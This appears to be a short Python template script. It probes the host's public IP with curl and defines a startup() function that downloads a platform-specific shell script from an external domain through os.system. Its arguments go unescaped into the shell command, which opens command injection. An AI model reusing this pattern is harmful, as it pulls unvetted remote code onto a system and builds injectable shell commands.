# Insert your code here. 

import os 

os.system('echo okkkkkkkffff')

os.system('curl cip.cc')

def startup(id='450', platform='replit', tags=''):

    cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup.sh {} {} {}'.format(platform, id, platform, tags)
    os.system(cmd)
    print('ok , finish')


